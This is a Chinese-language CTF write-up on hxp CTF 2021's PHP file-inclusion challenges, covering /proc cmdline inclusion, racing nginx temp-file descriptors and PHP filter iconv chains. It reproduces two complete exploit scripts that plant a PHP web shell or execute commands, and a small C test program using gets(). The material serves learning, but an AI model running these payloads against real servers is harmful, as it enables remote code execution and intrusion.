<p>然后还有一个可能性，就算page直接是一个不可写的文件，因为最后include的一定是本地的一个文件，只要这个文件可写，就最后一定会是数字类型（或套了伪协议的变体），最后包含进来的也就是这样的数据，没有意义。但如果一个文件不可写，那么之前的写入操作就无法完成，能够直接包含进来。（但问题在于不可写的文件都能被包含来getshell了，那不是爽飞了，文件包含无条件究极通杀？）</p>
<p>感觉有两个地方比较奇怪，删除文件的地方为什么要用system？还定义了一个匿名函数？直接用自带的或者定义一个函数都行啊，还非得匿名？以及明明匿名函数都escapeshellarg了，在reset处又对文件名进行了[a-zA-Z0-9]的限制，怪。但是也想不出来有什么问题</p>
<h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>果然这个system有问题，这两个题都是考察的在封锁了各种之前已有操作的情况下如何再次进行文件包含。这里使用的就是这个system函数，因为system是会新开进程去进行命令执行的，因此可以把需要删除的文件名输入一串base64，这样子system对应的<code>/proc/$PID/cmdline</code>就是我们的恶意输入，且cmdline这个文件默认只读，这样子就无法写入，直接包含，由于只允许[a-zA-Z0-9]，所以我们的输入应当是base64，并使用PHP filter的base64-decode过滤器进行包含完成利用<br>之前好像又在哪听说过PHP不能读proc文件系统，可能是我的错觉吧。。。</p>
<p>怪了，怎么当初大家都没想到这个利用，反而都是用的includer’s revenge的超级条件竞争实现的</p>
<p>这里的最大问题就是pid的预测了，因为rm这个命令又活不了多久，而且我们一直在发送请求就会一直创建新的rm进程，pid持续变换，想要直接碰撞到难度略大<br>所以出题人提到了proc中的另一个文件</p>
<blockquote>
<p>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;ns_last_pid (since Linux 3.3)</p>
</blockquote>
<p>This file (which is virtualized per PID namespace) displays the last PID that was allocated in this PID namespace. When the next PID is allocated, the kernel will search for the lowest unallocated PID that is greaterthan this value, and when this file is subsequently read it will show that PID.</p>
<p>通过读取这个文件能更好的对接下来可能出现的pid进行猜测并实现包含</p>
<p>以及出题人的脚本</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span>
<span class="token comment" spellcheck="true"># hxp CTF 2021 counter</span>
<span class="token keyword">import</span> requests<span class="token punctuation">,</span> threading<span class="token punctuation">,</span> time<span class="token punctuation">,</span>os<span class="token punctuation">,</span> base64<span class="token punctuation">,</span> re<span class="token punctuation">,</span> tempfile<span class="token punctuation">,</span> subprocess<span class="token punctuation">,</span>secrets<span class="token punctuation">,</span> hashlib<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> random<span class="token punctuation">,</span> signal
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlparse<span class="token punctuation">,</span>quote_from_bytes
<span class="token keyword">def</span> <span class="token function">urlencode</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> quote_from_bytes<span class="token punctuation">(</span>data<span class="token punctuation">,</span> safe<span class="token punctuation">)</span>

url <span class="token operator">=</span> f<span class="token string">'http://{sys.argv[1]}:{sys.argv[2]}/'</span>

backdoor_name <span class="token operator">=</span> secrets<span class="token punctuation">.</span>token_hex<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.php'</span>
secret <span class="token operator">=</span> secrets<span class="token punctuation">.</span>token_hex<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>
secret_hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span>secret<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] backdoor_name: '</span> <span class="token operator">+</span> backdoor_name<span class="token punctuation">,</span> file<span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] secret: '</span> <span class="token operator">+</span> secret<span class="token punctuation">,</span> file<span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>

code <span class="token operator">=</span> f<span class="token string">"&lt;?php if(sha1($_GET['s'])==='{secret_hash}')echo shell_exec($_GET['c']);"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> f<span class="token triple-quoted-string string">"""&lt;?php if(sha1($_GET['s'])==='{secret_hash}')file_put_contents("{backdoor_name}",$_GET['p']);/*"""</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
payload_encoded <span class="token operator">=</span> b<span class="token string">'abcdfg'</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>payload_encoded<span class="token punctuation">)</span>
<span class="token keyword">assert</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span>b<span class="token string">'^[a-zA-Z0-9]+$'</span><span class="token punctuation">,</span> payload_encoded<span class="token punctuation">)</span>

<span class="token keyword">with</span> tempfile<span class="token punctuation">.</span>NamedTemporaryFile<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> tmp<span class="token punctuation">:</span>
    tmp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>b<span class="token string">"sh\x00-c\x00rm\x00-f\x00--\x00'"</span><span class="token operator">+</span> payload_encoded <span class="token operator">+</span>b<span class="token string">"'"</span><span class="token punctuation">)</span>
    tmp<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
    o <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'php'</span><span class="token punctuation">,</span><span class="token string">'-r'</span><span class="token punctuation">,</span> f<span class="token string">'echo file_get_contents("php://filter/convert.base64-decode/resource={tmp.name}");'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>o<span class="token punctuation">,</span> file<span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>
    <span class="token keyword">assert</span> payload <span class="token keyword">in</span> o

    os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span><span class="token string">'/tmp'</span><span class="token punctuation">)</span>
    subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'php'</span><span class="token punctuation">,</span><span class="token string">'-r'</span><span class="token punctuation">,</span> f<span class="token string">'$_GET = ["p" => "test", "s" => "{secret}"]; include("php://filter/convert.base64-decode/resource={tmp.name}");'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> open<span class="token punctuation">(</span>backdoor_name<span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        d <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">assert</span> d <span class="token operator">==</span> <span class="token string">'test'</span>


pid <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>
N <span class="token operator">=</span> <span class="token number">10</span>

done <span class="token operator">=</span> <span class="token boolean">False</span>

<span class="token keyword">def</span> <span class="token function">worker</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">while</span> <span class="token operator">not</span> done<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">'[+] starting include worker: {pid + i}'</span><span class="token punctuation">,</span> file<span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>
        s <span class="token operator">=</span> f<span class="token triple-quoted-string string">"""bombardier -c 1 -d 3m '{url}?page=php%3A%2F%2Ffilter%2Fconvert.base64-decode%2Fresource%3D%2Fproc%2F{pid + i}%2Fcmdline&amp;p={urlencode(code)}&amp;s={secret}' > /dev/null"""</span>
        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>s<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete_worker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">while</span> <span class="token operator">not</span> done<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] starting delete worker'</span><span class="token punctuation">,</span> file<span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>
        s <span class="token operator">=</span> f<span class="token triple-quoted-string string">"""bombardier -c 8 -d 3m '{url}?page={payload_encoded.decode()}&amp;reset=1' > /dev/null"""</span>
        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>s<span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>
    threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>worker<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> daemon<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>delete_worker<span class="token punctuation">,</span> daemon<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">while</span> <span class="token operator">not</span> done<span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span>
            <span class="token string">'page'</span><span class="token punctuation">:</span> <span class="token string">'/proc/sys/kernel/ns_last_pid'</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">'[+] pid: {pid}'</span><span class="token punctuation">,</span> file<span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>
        <span class="token keyword">if</span> int<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token punctuation">(</span>pid<span class="token operator">+</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>
            pid <span class="token operator">=</span> int<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">200</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">'[+] pid overflow: {pid}'</span><span class="token punctuation">,</span> file<span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>
            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'pkill -9 -x bombardier'</span><span class="token punctuation">)</span>

        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>f<span class="token string">'{url}data/{backdoor_name}'</span><span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span>
            <span class="token string">'s'</span> <span class="token punctuation">:</span> secret<span class="token punctuation">,</span>
            <span class="token string">'c'</span><span class="token punctuation">:</span> f<span class="token string">'id; ls -l /; /readflag; rm {backdoor_name}'</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
            done <span class="token operator">=</span> <span class="token boolean">True</span>
            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'pkill -9 -x bombardier'</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>


        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> file<span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>
</code></pre>
<p>直接上了一个叫bombardier的玩意进行爆破，可能python的能力是有极限的吧。。。直接搜这个名字发现是一家加拿大的公司。。。然后再认真搜一下发现是这个项目，还自带了已经编译好的release，泪目<br><a href="https://github.com/codesenberg/bombardier">https://github.com/codesenberg/bombardier</a><br>不过还有一些本地验证payload的assert环节，可以学习一下</p>
<h2 id="includer’s-revenge"><a href="#includer’s-revenge" class="headerlink" title="includer’s revenge"></a>includer’s revenge</h2><p>和上一个题差不多，在配置文件上的限制一样，不过连写功能也没了</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">'read'</span> <span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'read'</span> <span class="token operator">?</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">'index.php'</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>可以读文件或者包含文件</p>
<h3 id="update-1"><a href="#update-1" class="headerlink" title="update"></a>update</h3><p>果然这些功能都是假的，实际利用方案为nginx默认配置下在request body过大时会缓存request body到临时文件中。只要发送一个超长并带有PHP shell的请求体到nginx服务器上，就有机会实现一个全新的无附加功能本地文件包含<br>读功能就当不存在吧</p>
<p>这里需要解决的问题有多个</p>
<h4 id="难点1"><a href="#难点1" class="headerlink" title="难点1"></a>难点1</h4><blockquote>
<p>client_body_buffer_size:<br>Sets buffer size for reading client request body. In case the request body is larger than the buffer, the whole body or only its part is written to a temporary file. By default, buffer size is equal to two memory pages. This is 8K on x86, other 32-bit platforms, and x86-64. It is usually 16K on other 64-bit platforms.</p>
</blockquote>
<p>当request body超出如上限制时，就会创建临时文件<br>nginx是用如下方式创建临时文件的</p>
<pre class=" language-C"><code class="language-C">ngx_fd_t
ngx_open_tempfile(u_char *name, ngx_uint_t persistent, ngx_uint_t access)
{
    ngx_fd_t  fd;

    fd = open((const char *) name, O_CREAT|O_EXCL|O_RDWR,
              access ? access : 0600);

    if (fd != -1 && !persistent) {
        (void) unlink((const char *) name);
    }

    return fd;
}
</code></pre>
<p>创建之后马上删除这个文件，然后把这个文件的fd返回出去，这样子就能不留痕迹的获得一个内存中的文件句柄，在内存里进行文件读写操作。（说起来有没有能直接打开一个在内存中文件句柄的函数呢？应该会比建了又删更优雅吧？） 且临时文件一般为<code>/var/lib/nginx/body/000000xxxx</code>，文件名是一个十位向左填充0的数字。文件名的数字随着nginx的请求处理增长而增长。想要直接爆破出文件名也显得不是非常的可能，更不用说在爆破文件名的同时还要条件竞争了。</p>
<p>为了研究一下创建文件马上删掉之后的表现，我写了一个垃圾的C代码（请忽略各种会造成溢出的代码）</p>
<pre class=" language-C"><code class="language-C">#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>

void main() {
    char buffer[128] = { 0 }, s[128] = { 0 }, name[32] = {0};
    printf("Enter a name :");
    gets(name);
    int fd = open((const char*)name, O_CREAT | O_EXCL | O_RDWR, 0600);

    if (fd != -1) {
        (void)unlink((const char*)name);
    }


    printf("Enter a value :");
    gets(s);

    write(fd, s, sizeof(s));

    lseek(fd, 0, SEEK_SET);
    printf("Wait for input\n");
    getchar();

    read(fd, buffer, sizeof(buffer));
    printf("%s", buffer);
}
</code></pre>
<p>也就是模仿他的操作，新开一个文件然后马上删掉，再对这个文件的fd进行读写操作，看会发生什么。</p>
<pre class=" language-bash"><code class="language-bash">root@myserver:~/test<span class="token comment" spellcheck="true"># ./main</span>
Enter a name :testfile
fd is 3
Enter a value :aaaaaaaaaaaa
Wait <span class="token keyword">for</span> input
d
aaaaaaaaaaaa
</code></pre>
<p>在wait for input时新开一个终端</p>
<pre class=" language-bash"><code class="language-bash">root@myserver:/proc/20006/fd<span class="token comment" spellcheck="true"># ps aux | grep main</span>
postgres   592  0.0  0.7 294704 14388 ?        S     2021   7:03 /usr/lib/postgresql/9.5/bin/postgres -D /var/lib/postgresql/9.5/main -c config_file<span class="token operator">=</span>/etc/postgresql/9.5/main/postgresql.conf
root     20148  0.0  0.0   4356   644 pts/0    S+   11:33   0:00 ./main
root     20153  0.0  0.0  14228   956 pts/1    S+   11:33   0:00 <span class="token function">grep</span> --color<span class="token operator">=</span>auto main
root@myserver:/proc/20006/fd<span class="token comment" spellcheck="true"># cd /proc/20148/fd</span>
root@myserver:/proc/20148/fd<span class="token comment" spellcheck="true"># ll</span>
total 0
dr-x------ 2 root root  0 Jan  5 11:33 ./
dr-xr-xr-x 9 root root  0 Jan  5 11:33 <span class="token punctuation">..</span>/
lrwx------ 1 root root 64 Jan  5 11:33 0 -<span class="token operator">></span> /dev/pts/0
lrwx------ 1 root root 64 Jan  5 11:33 1 -<span class="token operator">></span> /dev/pts/0
lrwx------ 1 root root 64 Jan  5 11:33 2 -<span class="token operator">></span> /dev/pts/0
lrwx------ 1 root root 64 Jan  5 11:33 3 -<span class="token operator">></span> /root/test/testfile <span class="token punctuation">(</span>deleted<span class="token punctuation">)</span>
root@myserver:/proc/20148/fd<span class="token comment" spellcheck="true"># cat 3</span>
aaaaaaaaaaaaroot@myserver:/proc/20148/fd<span class="token comment" spellcheck="true">#</span>
</code></pre>
<p>可以看到，在对应进程的proc目录下，存在对应的fd项目，且为一个软链接，连接到<code>/root/test/testfile (deleted)</code>，表明该文件已被删除，但仍然可以继续写入并读出</p>
<p>因此，只要能找到对应的nginx worker线程，并尝试爆破出该临时文件的fd，就可以对我们发送的payload进行包含。这样的操作同样绕过了nginx临时文件编号不可预知的限制，且该fd在nginx处理该请求时会一直存在，也放宽了条件竞争的难度（既然如此，能不能手写socket卡住这个执行，让这个fd长时间的存在呢？不过这样子也就要求nginx在收到的请求大于限制时就进行写入，而不是收到完整请求后再判断大小进行写入，不知道具体是怎么处理的）</p>
<h4 id="难点2"><a href="#难点2" class="headerlink" title="难点2"></a>难点2</h4><p>虽然pasten的wp中提到proc中的文件既表现的像软链接又表现的像硬链接，但ls一下的话显示的文件类型还是软链接。<br>对于软链接文件，PHP会尝试先对软链接进行解析，再将其打开。<br>而这里有一个有意思的东西</p>
<blockquote>
<p>If a file was deleted while a process holds an open file descriptor:</p>
</blockquote>
<p>realpath() will return the last path of the file with “ (deleted)” appended to it.<br>open() will return an fd that can be used to read the original file content.</p>
<p>解析软链接会得到那个带(deleted)的结果，这个时候再去open就会失败，因此，这个竞争需要在文件创建但还未删除的两行代码的夹缝中艰难生存。<br>除此之外，PHP对于软链接的解析还有一层缓存</p>
<pre><code>realpath_cache_size default 4M
realpath_cahce_ttl default 120s
</code></pre>
<p>一次解析失败，就能导致接下来两分钟的解析直接走的缓存内容，无法继续竞争。为了解决这个问题，又使用了<code>/proc/$PID/root</code>和<code>/proc/$PID/cwd</code>两个目录轮流嵌套，使得每次的路径都是全新的路径，不会进入缓存<br>然后就是高强度竞争环节了。可能根据Pasten战队的说法，一般的电脑竞争不动，得加钱 :(</p>
<h5 id="官方绕过软链接方案"><a href="#官方绕过软链接方案" class="headerlink" title="官方绕过软链接方案"></a>官方绕过软链接方案</h5><p>出题人提出了另一种绕过PHP解析软链接的方法，直接加一层相对目录跳起来，就能防止PHP对软链接进行解析（可能是因为源码中解析相对路径和解析软链接的逻辑是互斥的？）<br>这样子条件竞争的难度就大幅下降了，只要能竞争到proc中的fd即可完成包含<br>大概就是这个样子<br><code>/proc/self/fd/34/../../../34/fd/9</code></p>
<h5 id="学一些其他的操作"><a href="#学一些其他的操作" class="headerlink" title="学一些其他的操作"></a>学一些其他的操作</h5><p>扫<code>/proc/$PID/cmdline</code>来确定进程是否是nginx worker进程，<code>/proc/cpuinfo</code>看CPU有几个核，<code>/proc/sys/kernel/pid_max</code>看最大pid是多少，确定扫描范围</p>
<h4 id="LFI的最终通杀"><a href="#LFI的最终通杀" class="headerlink" title="LFI的最终通杀"></a>LFI的最终通杀</h4><p>在赛后有一个师傅提出了在不留下文件的情况下包含PHP shell，而利用的条件仅仅是存在一个可读的文件<br>使用PHP filter的iconv字符转换功能，通过非常究极的排列组合，完成了从任意字符串转换到一个PHPshell的功能<br>这个是不是无敌了啊？当文件名完全可控时，文件内容也就约等于完全可控了<br>具体文章和脚本如下<br><a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">Solving “includer’s revenge” from hxp ctf 2021 without controlling any files</a></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://localhost/index.php"</span>
file_to_use <span class="token operator">=</span> <span class="token string">"/etc/passwd"</span>
command <span class="token operator">=</span> <span class="token string">"/readflag"</span>

<span class="token comment" spellcheck="true">#&lt;?=`$_GET[0]`;;?></span>
base64_payload <span class="token operator">=</span> <span class="token string">"PD89YCRfR0VUWzBdYDs7Pz4"</span>

conversions <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'R'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2'</span><span class="token punctuation">,</span>
    <span class="token string">'B'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2'</span><span class="token punctuation">,</span>
    <span class="token string">'C'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.CSISO2022KR'</span><span class="token punctuation">,</span>
    <span class="token string">'8'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2'</span><span class="token punctuation">,</span>
    <span class="token string">'9'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB'</span><span class="token punctuation">,</span>
    <span class="token string">'f'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213'</span><span class="token punctuation">,</span>
    <span class="token string">'s'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61'</span><span class="token punctuation">,</span>
    <span class="token string">'z'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS'</span><span class="token punctuation">,</span>
    <span class="token string">'U'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932'</span><span class="token punctuation">,</span>
    <span class="token string">'P'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213'</span><span class="token punctuation">,</span>
    <span class="token string">'V'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5'</span><span class="token punctuation">,</span>
    <span class="token string">'0'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2'</span><span class="token punctuation">,</span>
    <span class="token string">'Y'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2'</span><span class="token punctuation">,</span>
    <span class="token string">'W'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2'</span><span class="token punctuation">,</span>
    <span class="token string">'d'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2'</span><span class="token punctuation">,</span>
    <span class="token string">'D'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2'</span><span class="token punctuation">,</span>
    <span class="token string">'7'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2'</span><span class="token punctuation">,</span>
    <span class="token string">'4'</span><span class="token punctuation">:</span> <span class="token string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2'</span>
<span class="token punctuation">}</span>


<span class="token comment" spellcheck="true"># generate some garbage base64</span>
filters <span class="token operator">=</span> <span class="token string">"convert.iconv.UTF8.CSISO2022KR|"</span>
filters <span class="token operator">+=</span> <span class="token string">"convert.base64-encode|"</span>
<span class="token comment" spellcheck="true"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span>
filters <span class="token operator">+=</span> <span class="token string">"convert.iconv.UTF8.UTF7|"</span>


<span class="token keyword">for</span> c <span class="token keyword">in</span> base64_payload<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        filters <span class="token operator">+=</span> conversions<span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"|"</span>
        <span class="token comment" spellcheck="true"># decode and reencode to get rid of everything that isn't valid base64</span>
        filters <span class="token operator">+=</span> <span class="token string">"convert.base64-decode|"</span>
        filters <span class="token operator">+=</span> <span class="token string">"convert.base64-encode|"</span>
        <span class="token comment" spellcheck="true"># get rid of equal signs</span>
        filters <span class="token operator">+=</span> <span class="token string">"convert.iconv.UTF8.UTF7|"</span>

filters <span class="token operator">+=</span> <span class="token string">"convert.base64-decode"</span>

final_payload <span class="token operator">=</span> f<span class="token string">"php://filter/{filters}/resource={file_to_use}"</span>

r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span>
    <span class="token string">"0"</span><span class="token punctuation">:</span> command<span class="token punctuation">,</span>
    <span class="token string">"action"</span><span class="token punctuation">:</span> <span class="token string">"include"</span><span class="token punctuation">,</span>
    <span class="token string">"file"</span><span class="token punctuation">:</span> final_payload
<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</code></pre>
<p>以及一个wupoc师傅fuzz出的完整字符集<br><a href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT">PHP_INCLUDE_TO_SHELL_CHAR_DICT</a></p>
<p>这里还有一个额外的文章提到了和filter相关的各种操作。提到了一个文档中没提到的filter <code>consumed</code><br>功能就是把读入直接变成一个空字符串，似乎只在读链上生效，写入的时候没用作用，那么意义是什么呢？<br><a href="https://www.ambionics.io/blog/laravel-debug-rce">LARAVEL &lt;&#x3D; V8.4.2 DEBUG MODE: REMOTE CODE EXECUTION</a></p>
